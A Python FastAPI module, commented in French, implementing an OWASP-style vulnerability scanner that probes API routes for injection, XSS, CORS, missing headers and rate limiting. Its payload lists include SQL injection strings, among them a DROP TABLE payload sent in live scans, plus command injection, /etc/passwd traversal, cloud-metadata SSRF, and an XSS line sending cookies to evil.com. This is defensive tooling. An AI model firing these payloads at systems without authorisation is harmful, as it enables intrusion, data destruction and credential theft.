"""
Module Security Scanner - Tests de sécurité avancés
Scanner de vulnérabilités complet avec tests OWASP
"""

import asyncio
import re
import json
import time
import uuid
from datetime import datetime
from typing import List, Dict, Optional, Any, Tuple
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
import httpx

from .models.security import (
    Vulnerability,
    VulnerabilityType,
    VulnerabilitySeverity,
    VulnerabilityStatus,
    OWASPCategory,
    SecurityScanResult,
    SecurityScanConfig,
    ScanType,
    SecurityHeader,
    CORSAnalysis,
)
from .models.route import DiscoveredRoute, HttpMethod
from .server_discovery import _discovered_servers
from .route_discovery import _discovered_routes

router = APIRouter()

# Stores
_scan_results: Dict[str, SecurityScanResult] = {}
_vulnerabilities: Dict[str, Vulnerability] = {}


# ============================================================================
# Payloads de Test
# ============================================================================

class SecurityPayloads:
    """Payloads pour les tests de sécurité"""
    
    SQL_INJECTION = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1; DROP TABLE users--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "admin'--",
        "' OR 1=1#",
        "' OR 'x'='x",
    ]
    
    NOSQL_INJECTION = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$where": "1==1"}',
        '{"$regex": ".*"}',
        '{"$or": [{}]}',
    ]
    
    XSS_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "'-alert('XSS')-'",
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '{{constructor.constructor("alert(1)")()}}',
        '${alert("XSS")}',
        '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
    ]
    
    COMMAND_INJECTION = [
        "; ls -la",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "& ping -c 1 127.0.0.1 &",
        "| sleep 5",
        "; echo vulnerable",
        "|| echo vulnerable",
        "&& echo vulnerable",
    ]
    
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg",
    ]
    
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://0.0.0.0",
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/",
    ]


# ============================================================================
# Scanners Spécialisés
# ============================================================================

class InjectionScanner:
    """Scanner pour les vulnérabilités d'injection"""
    
    @classmethod
    async def scan_sql_injection(
        cls, 
        base_url: str, 
        route: DiscoveredRoute,
        server_id: str
    ) -> List[Vulnerability]:
        """Teste les injections SQL"""
        vulnerabilities = []
        
        # Tester chaque paramètre
        params_to_test = []
        for param in route.path_params + route.query_params:
            params_to_test.append((param.name, param.location.value))
        
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for param_name, location in params_to_test:
                for payload in SecurityPayloads.SQL_INJECTION[:5]:  # Limiter
                    try:
                        # Construire la requête
                        url = base_url + route.path.replace(f":{param_name}", payload).replace(f"{{{param_name}}}", payload)
                        
                        if location == "query":
                            url = f"{url}?{param_name}={payload}"
                        
                        start_time = time.time()
                        response = await client.request(route.method.value, url)
                        response_time = time.time() - start_time
                        
                        # Analyser la réponse
                        is_vulnerable = False
                        evidence = ""
                        
                        # Détection basée sur le temps (time-based)
                        if "SLEEP" in payload.upper() and response_time > 4:
                            is_vulnerable = True
                            evidence = f"Response time: {response_time:.2f}s (expected delay)"
                        
                        # Détection basée sur les erreurs
                        error_patterns = [
                            r"sql syntax",
                            r"mysql_fetch",
                            r"sqlite_",
                            r"pg_query",
                            r"ORA-\d+",
                            r"syntax error",
                            r"unclosed quotation mark",
                        ]
                        
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.I):
                                is_vulnerable = True
                                evidence = f"SQL error pattern found: {pattern}"
                                break
                        
                        # Détection basée sur la différence de réponse
                        if "' OR '1'='1" in payload and response.status_code == 200:
                            # Comparer avec une requête normale
                            normal_response = await client.request(
                                route.method.value, 
                                base_url + route.path.replace(f":{param_name}", "1")
                            )
                            if len(response.text) > len(normal_response.text) * 2:
                                is_vulnerable = True
                                evidence = "Response size significantly different with boolean-based payload"
                        
                        if is_vulnerable:
                            vuln = Vulnerability(
                                type=VulnerabilityType.SQL_INJECTION,
                                category=OWASPCategory.A03_INJECTION,
                                cwe_id="CWE-89",
                                severity=VulnerabilitySeverity.CRITICAL,
                                server_id=server_id,
                                route_id=route.id,
                                parameter=param_name,
                                location=location,
                                title=f"SQL Injection in {param_name}",
                                description=f"The parameter '{param_name}' is vulnerable to SQL injection attacks.",
                                evidence=evidence,
                                payload_used=payload,
                                request_sample=f"{route.method.value} {url}",
                                recommendation="Use parameterized queries or prepared statements. Validate and sanitize all user inputs.",
                                references=[
                                    "https://owasp.org/Top10/A03_2021-Injection/",
                                    "https://cwe.mitre.org/data/definitions/89.html"
                                ]
                            )
                            vulnerabilities.append(vuln)
                            break  # Un payload suffit pour confirmer
                            
                    except Exception as e:
                        pass
        
        return vulnerabilities
    
    @classmethod
    async def scan_xss(
        cls,
        base_url: str,
        route: DiscoveredRoute,
        server_id: str
    ) -> List[Vulnerability]:
        """Teste les vulnérabilités XSS"""
        vulnerabilities = []
        
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for param in route.path_params + route.query_params:
                for payload in SecurityPayloads.XSS_PAYLOADS[:3]:
                    try:
                        url = base_url + route.path
                        
                        if param.location.value == "query":
                            url = f"{url}?{param.name}={payload}"
                        
                        response = await client.request(route.method.value, url)
                        
                        # Vérifier si le payload est réfléchi
                        if payload in response.text:
                            # Vérifier si c'est échappé
                            escaped = payload.replace('<', '&lt;').replace('>', '&gt;')
                            if escaped not in response.text:
                                vuln = Vulnerability(
                                    type=VulnerabilityType.REFLECTED_XSS,
                                    category=OWASPCategory.A03_INJECTION,
                                    cwe_id="CWE-79",
                                    severity=VulnerabilitySeverity.HIGH,
                                    server_id=server_id,
                                    route_id=route.id,
                                    parameter=param.name,
                                    location=param.location.value,
                                    title=f"Reflected XSS in {param.name}",
                                    description=f"The parameter '{param.name}' reflects user input without proper encoding, allowing XSS attacks.",
                                    evidence=f"Payload '{payload[:50]}...' reflected in response",
                                    payload_used=payload,
                                    recommendation="Encode all user input before reflecting it in the response. Use Content-Security-Policy headers.",
                                    references=[
                                        "https://owasp.org/www-community/attacks/xss/",
                                        "https://cwe.mitre.org/data/definitions/79.html"
                                    ]
                                )
                                vulnerabilities.append(vuln)
                                break
                                
                    except Exception as e:
                        pass
        
        return vulnerabilities


class HeadersScanner:
    """Scanner pour les headers de sécurité"""
    
    SECURITY_HEADERS = [
        SecurityHeader(
            name="Strict-Transport-Security",
            recommended_value="max-age=31536000; includeSubDomains",
            description="Forces HTTPS connections",
            severity_if_missing=VulnerabilitySeverity.MEDIUM
        ),
        SecurityHeader(
            name="X-Content-Type-Options",
            recommended_value="nosniff",
            description="Prevents MIME type sniffing",
            severity_if_missing=VulnerabilitySeverity.LOW
        ),
        SecurityHeader(
            name="X-Frame-Options",
            recommended_value="DENY",
            description="Prevents clickjacking attacks",
            severity_if_missing=VulnerabilitySeverity.MEDIUM
        ),
        SecurityHeader(
            name="Content-Security-Policy",
            recommended_value="default-src 'self'",
            description="Controls resources the browser can load",
            severity_if_missing=VulnerabilitySeverity.MEDIUM
        ),
        SecurityHeader(
            name="X-XSS-Protection",
            recommended_value="1; mode=block",
            description="Enables XSS filtering (deprecated but still useful)",
            severity_if_missing=VulnerabilitySeverity.LOW
        ),
        SecurityHeader(
            name="Referrer-Policy",
            recommended_value="strict-origin-when-cross-origin",
            description="Controls referrer information",
            severity_if_missing=VulnerabilitySeverity.LOW
        ),
    ]
    
    @classmethod
    async def scan(cls, base_url: str, server_id: str) -> List[Vulnerability]:
        """Analyse les headers de sécurité"""
        vulnerabilities = []
        
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            try:
                response = await client.get(base_url)
                headers = dict(response.headers)
                
                for security_header in cls.SECURITY_HEADERS:
                    header_lower = {k.lower(): v for k, v in headers.items()}
                    header_name_lower = security_header.name.lower()
                    
                    if header_name_lower not in header_lower:
                        vuln = Vulnerability(
                            type=VulnerabilityType.MISSING_SECURITY_HEADERS,
                            category=OWASPCategory.A05_SECURITY_MISCONFIGURATION,
                            severity=security_header.severity_if_missing,
                            server_id=server_id,
                            title=f"Missing {security_header.name} Header",
                            description=f"The security header '{security_header.name}' is not set. {security_header.description}.",
                            evidence=f"Header not found in response",
                            recommendation=f"Add the header: {security_header.name}: {security_header.recommended_value}",
                            references=["https://owasp.org/www-project-secure-headers/"]
                        )
                        vulnerabilities.append(vuln)
                        
            except Exception as e:
                pass
        
        return vulnerabilities


class CORSScanner:
    """Scanner pour les vulnérabilités CORS"""
    
    @classmethod
    async def scan(cls, base_url: str, server_id: str) -> Tuple[CORSAnalysis, List[Vulnerability]]:
        """Analyse la configuration CORS"""
        analysis = CORSAnalysis()
        vulnerabilities = []
        
        test_origins = [
            "https://evil.com",
            "null",
            base_url,
            "https://attacker.com",
        ]
        
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for origin in test_origins:
                try:
                    response = await client.options(
                        base_url,
                        headers={"Origin": origin}
                    )
                    
                    cors_headers = {
                        k.lower(): v for k, v in response.headers.items()
                        if k.lower().startswith('access-control-')
                    }
                    
                    allow_origin = cors_headers.get('access-control-allow-origin', '')
                    allow_credentials = cors_headers.get('access-control-allow-credentials', '').lower() == 'true'
                    
                    analysis.allow_origin = allow_origin
                    analysis.allow_credentials = allow_credentials
                    
                    # Vérifier les vulnérabilités
                    if allow_origin == '*':
                        analysis.has_wildcard_origin = True
                        if allow_credentials:
                            analysis.credentials_with_wildcard = True
                            vuln = Vulnerability(
                                type=VulnerabilityType.CORS_MISCONFIGURATION,
                                category=OWASPCategory.A05_SECURITY_MISCONFIGURATION,
                                severity=VulnerabilitySeverity.HIGH,
                                server_id=server_id,
                                title="CORS Wildcard with Credentials",
                                description="The API allows any origin with credentials, which is a critical CORS misconfiguration.",
                                evidence=f"Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true",
                                recommendation="Implement a whitelist of allowed origins instead of using wildcards.",
                            )
                            vulnerabilities.append(vuln)
                    
                    if allow_origin == origin and origin in ["https://evil.com", "https://attacker.com"]:
                        analysis.reflects_origin = True
                        vuln = Vulnerability(
                            type=VulnerabilityType.CORS_MISCONFIGURATION,
                            category=OWASPCategory.A05_SECURITY_MISCONFIGURATION,
                            severity=VulnerabilitySeverity.HIGH,
                            server_id=server_id,
                            title="CORS Origin Reflection",
                            description="The API reflects the Origin header without validation, allowing any domain to make requests.",
                            evidence=f"Origin '{origin}' was reflected in Access-Control-Allow-Origin",
                            recommendation="Validate the Origin header against a whitelist of allowed domains.",
                        )
                        vulnerabilities.append(vuln)
                    
                    if allow_origin == "null":
                        analysis.has_null_origin = True
                        vuln = Vulnerability(
                            type=VulnerabilityType.CORS_MISCONFIGURATION,
                            category=OWASPCategory.A05_SECURITY_MISCONFIGURATION,
                            severity=VulnerabilitySeverity.MEDIUM,
                            server_id=server_id,
                            title="CORS Null Origin Allowed",
                            description="The API allows the 'null' origin, which can be exploited via sandboxed iframes.",
                            evidence="Access-Control-Allow-Origin: null",
                            recommendation="Do not allow the 'null' origin.",
                        )
                        vulnerabilities.append(vuln)
                        
                except Exception as e:
                    pass
        
        analysis.vulnerabilities = vulnerabilities
        return analysis, vulnerabilities


class RateLimitScanner:
    """Scanner pour le rate limiting"""
    
    @classmethod
    async def scan(cls, base_url: str, route: DiscoveredRoute, server_id: str) -> List[Vulnerability]:
        """Teste la présence de rate limiting"""
        vulnerabilities = []
        
        url = base_url + route.path.replace('{id}', '1').replace(':id', '1')
        
        async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
            # Envoyer plusieurs requêtes rapides
            responses = []
            
            for _ in range(50):
                try:
                    response = await client.request(route.method.value, url)
                    responses.append(response.status_code)
                except:
                    break
            
            # Vérifier si on a été limité
            rate_limited = any(code == 429 for code in responses)
            
            if not rate_limited and len(responses) >= 50:
                vuln = Vulnerability(
                    type=VulnerabilityType.NO_RATE_LIMITING,
                    category=OWASPCategory.A05_SECURITY_MISCONFIGURATION,
                    severity=VulnerabilitySeverity.MEDIUM,
                    server_id=server_id,
                    route_id=route.id,
                    title="No Rate Limiting Detected",
                    description=f"The endpoint {route.path} does not appear to have rate limiting, making it vulnerable to brute force and DoS attacks.",
                    evidence=f"50 requests completed without receiving 429 response",
                    recommendation="Implement rate limiting using middleware or a reverse proxy.",
                )
                vulnerabilities.append(vuln)
        
        return vulnerabilities


# ============================================================================
# Service Principal
# ============================================================================

class SecurityScannerService:
    """Service principal du scanner de sécurité"""
    
    def __init__(self):
        self.results = _scan_results
        self.vulnerabilities = _vulnerabilities
        self.servers = _discovered_servers
        self.routes = _discovered_routes
    
    async def run_scan(
        self, 
        config: SecurityScanConfig
    ) -> SecurityScanResult:
        """Exécute un scan de sécurité"""
        result = SecurityScanResult(config=config)
        result.started_at = datetime.now()
        
        # Récupérer les serveurs à scanner
        server_ids = config.server_ids if config.server_ids else list(self.servers.keys())
        
        for server_id in server_ids:
            if server_id not in self.servers:
                continue
            
            server = self.servers[server_id]
            base_url = server.base_url
            
            # Scanner les headers
            if config.test_headers:
                vulns = await HeadersScanner.scan(base_url, server_id)
                result.vulnerabilities.extend(vulns)
            
            # Scanner CORS
            if config.test_cors:
                _, vulns = await CORSScanner.scan(base_url, server_id)
                result.vulnerabilities.extend(vulns)
            
            # Scanner chaque route
            routes_to_scan = [
                r for r in self.routes.values() 
                if r.server_id == server_id
            ]
            
            if config.route_ids:
                routes_to_scan = [r for r in routes_to_scan if r.id in config.route_ids]
            
            for route in routes_to_scan:
                result.routes_scanned += 1
                
                # Tests d'injection
                if config.test_injections:
                    vulns = await InjectionScanner.scan_sql_injection(base_url, route, server_id)
                    result.vulnerabilities.extend(vulns)
                
                # Tests XSS
                if config.test_xss:
                    vulns = await InjectionScanner.scan_xss(base_url, route, server_id)
                    result.vulnerabilities.extend(vulns)
                
                # Rate limiting
                if config.test_rate_limiting:
                    vulns = await RateLimitScanner.scan(base_url, route, server_id)
                    result.vulnerabilities.extend(vulns)
        
        result.completed_at = datetime.now()
        result.duration_ms = (result.completed_at - result.started_at).total_seconds() * 1000
        
        # Calculer les stats
        for vuln in result.vulnerabilities:
            self.vulnerabilities[vuln.id] = vuln
            
            if vuln.severity == VulnerabilitySeverity.CRITICAL:
                result.critical_count += 1
            elif vuln.severity == VulnerabilitySeverity.HIGH:
                result.high_count += 1
            elif vuln.severity == VulnerabilitySeverity.MEDIUM:
                result.medium_count += 1
            elif vuln.severity == VulnerabilitySeverity.LOW:
                result.low_count += 1
            else:
                result.info_count += 1
        
        result.calculate_score()
        
        self.results[result.id] = result
        return result
    
    async def run_quick_scan(self, server_id: str) -> SecurityScanResult:
        """Exécute un scan rapide"""
        config = SecurityScanConfig(
            scan_type=ScanType.QUICK,
            server_ids=[server_id],
            test_injections=False,  # Skip les tests lents
            test_rate_limiting=False,
        )
        return await self.run_scan(config)


# Instance singleton
_service = SecurityScannerService()


# ============================================================================
# Endpoints API
# ============================================================================

class ScanRequest(BaseModel):
    """Requête de scan"""
    server_ids: List[str] = []
    route_ids: List[str] = []
    scan_type: ScanType = ScanType.STANDARD
    test_injections: bool = True
    test_xss: bool = True
    test_headers: bool = True
    test_cors: bool = True
    test_rate_limiting: bool = True


@router.post("/scan", response_model=SecurityScanResult)
async def run_scan(request: ScanRequest):
    """
    Lance un scan de sécurité complet.
    """
    config = SecurityScanConfig(
        scan_type=request.scan_type,
        server_ids=request.server_ids,
        route_ids=request.route_ids,
        test_injections=request.test_injections,
        test_xss=request.test_xss,
        test_headers=request.test_headers,
        test_cors=request.test_cors,
        test_rate_limiting=request.test_rate_limiting,
    )
    return await _service.run_scan(config)


@router.post("/scan/quick/{server_id}", response_model=SecurityScanResult)
async def run_quick_scan(server_id: str):
    """
    Lance un scan rapide sur un serveur.
    """
    return await _service.run_quick_scan(server_id)


@router.get("/scans", response_model=List[SecurityScanResult])
async def list_scans():
    """
    Liste tous les résultats de scans.
    """
    return sorted(_scan_results.values(), key=lambda r: r.started_at, reverse=True)


@router.get("/scans/{scan_id}", response_model=SecurityScanResult)
async def get_scan(scan_id: str):
    """
    Récupère un résultat de scan.
    """
    if scan_id not in _scan_results:
        raise HTTPException(status_code=404, detail="Scan not found")
    return _scan_results[scan_id]


@router.get("/vulnerabilities", response_model=List[Vulnerability])
async def list_vulnerabilities(
    severity: Optional[VulnerabilitySeverity] = None,
    type: Optional[VulnerabilityType] = None,
    status: Optional[VulnerabilityStatus] = None
):
    """
    Liste les vulnérabilités avec filtres optionnels.
    """
    vulns = list(_vulnerabilities.values())
    
    if severity:
        vulns = [v for v in vulns if v.severity == severity]
    if type:
        vulns = [v for v in vulns if v.type == type]
    if status:
        vulns = [v for v in vulns if v.status == status]
    
    return sorted(vulns, key=lambda v: (
        {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}[v.severity.value],
        v.discovered_at
    ))


@router.get("/vulnerabilities/{vuln_id}", response_model=Vulnerability)
async def get_vulnerability(vuln_id: str):
    """
    Récupère une vulnérabilité.
    """
    if vuln_id not in _vulnerabilities:
        raise HTTPException(status_code=404, detail="Vulnerability not found")
    return _vulnerabilities[vuln_id]


@router.put("/vulnerabilities/{vuln_id}/status")
async def update_vulnerability_status(vuln_id: str, status: VulnerabilityStatus):
    """
    Met à jour le statut d'une vulnérabilité.
    """
    if vuln_id not in _vulnerabilities:
        raise HTTPException(status_code=404, detail="Vulnerability not found")
    
    _vulnerabilities[vuln_id].status = status
    return {"status": "ok", "message": f"Status updated to {status.value}"}


@router.get("/summary")
async def get_summary():
    """
    Récupère un résumé global de la sécurité.
    """
    vulns = list(_vulnerabilities.values())
    open_vulns = [v for v in vulns if v.status == VulnerabilityStatus.OPEN]
    
    return {
        "total_vulnerabilities": len(vulns),
        "open_vulnerabilities": len(open_vulns),
        "by_severity": {
            "critical": len([v for v in open_vulns if v.severity == VulnerabilitySeverity.CRITICAL]),
            "high": len([v for v in open_vulns if v.severity == VulnerabilitySeverity.HIGH]),
            "medium": len([v for v in open_vulns if v.severity == VulnerabilitySeverity.MEDIUM]),
            "low": len([v for v in open_vulns if v.severity == VulnerabilitySeverity.LOW]),
            "info": len([v for v in open_vulns if v.severity == VulnerabilitySeverity.INFO]),
        },
        "total_scans": len(_scan_results),
        "servers_scanned": len(set(v.server_id for v in vulns)),
    }
